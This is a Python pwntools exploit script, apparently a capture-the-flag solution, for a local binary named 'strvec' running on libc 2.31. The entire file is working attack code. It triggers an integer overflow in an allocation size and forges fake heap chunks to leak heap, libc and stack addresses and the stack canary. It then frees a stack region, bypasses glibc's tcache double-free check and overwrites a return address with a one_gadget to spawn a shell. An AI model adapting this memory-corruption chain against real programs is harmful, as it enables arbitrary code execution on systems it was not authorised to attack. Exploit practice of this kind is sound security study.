from pwn import *


def debug(func):
    def wrapper(*args, **kwargs):
        print('{}({}, {})'.format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def vec_get(idx):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx = ', b'%d' % idx)
    io.recvuntil(b' -> ')
    data = io.recvuntil(b'1.')[:-3]
    if b'[undefined]' in data:
        return None
    else:
        return data.rstrip()

@debug
def vec_set(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx = ', b'%d' % idx)
    if len(data) == 0x20:
        io.sendafter(b'data = ', data)
    else:
        io.sendlineafter(b'data = ', data)
    io.recvuntil(b'vec.set')


binpath = './strvec'
elf = ELF(binpath)
# libc = elf.libc
libc = ELF('./libc-2.31.so')

context.terminal = ['tmux', 'split-w', '-h']
context.binary = elf
# context.log_level = 'DEBUG'

gdbscript = '''
gef
# b main
# switch-case
# b *0x55555555553b

# b vector_get

# vec on heap
set $vec=0x00005555555592a0
# name on stack
set $name=0x00007fffffffdd70
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)

# overflown size:  8
# correct size:    4294967304
# this will cause the size calculation to overflow like above
nmemb = 536870912

# name = b'hoge'
name = b'A' * 8 + p64(0x30)[:-2]  # fake size on stack
io.sendlineafter(b'Name: ', name)
io.sendlineafter(b'n = ', b'%d' % nmemb)

# create loop
vec_set(3, b'')

data = vec_get(3)
addr_chunk = u64(data.ljust(8, b'\x00'))
addr_heap = addr_chunk - 0x2c0
addr_elements = addr_heap + 0x2a8
print('addr_heap = 0x{:x}'.format(addr_heap))

payload = b''
payload += p64(addr_chunk + 0x40)
payload += p64(0x501)  # fake size
vec_set(200, payload)

for i in range(1, 28):
    vec_set(200 + i, chr(ord(b'a') + i).encode() * 8)

vec_set(9, b'free fake chunk')

# leak libc
addr_small_bin = addr_heap + 0x308
vec_set(230, p64(addr_small_bin)[:-1])
data = vec_get((addr_heap + 0x300 - addr_elements) // 8)  # 11
addr_main_arena = u64(data.ljust(8, b'\x00'))
addr_libc = addr_main_arena - 0x1ec010
libc.address = addr_libc
print('addr_main_arena = 0x{:x}'.format(addr_main_arena))
print('addr_libc = 0x{:x}'.format(addr_libc))

# leak stack address
vec_set(231, p64(libc.symbols['environ'])[:-1])
data = vec_get(17)
addr_envs = u64(data.ljust(8, b'\x00'))
addr_name = addr_envs - 0x128
addr_canary = addr_name +0x18
print('addr_name = 0x{:x}'.format(addr_name))
print('addr_canary = 0x{:x}'.format(addr_canary))

# leak canary
vec_set(232, p64(addr_canary + 1))
data = vec_get(23)
canary = u64(data.rjust(8, b'\x00'))
print('canary = 0x{:x}'.format(canary))

# free stack
vec_set(233, p64(addr_name + 0x10) + p64(addr_name - 0x20)[:-1])
vec_set(29, b'free stack')
# vec_set(30, b'hogefug')

# one_gadget
one_gadget_offs = [945278, 945281, 945284]
addr_one_gadget = libc.address + one_gadget_offs[1]

payload = b''
payload += p64(0xdeadbeef)
payload += p64(canary)
payload += p64(0xcafebabe)
payload += p64(addr_one_gadget)[:-2]
vec_set(235, payload)

# overwrite vector->size = 0
# free vector so that vector->next = NULL, which is actually vector->size = 0
vec_set(234, p64(addr_heap + 0x2a0)[:-2])
vec_set(41, b'free vector')
# overwrite tcache key to shut the double free detection mechanism up
vec_set(0, b'brazil')

io.sendline(b'give me shell')

io.interactive()
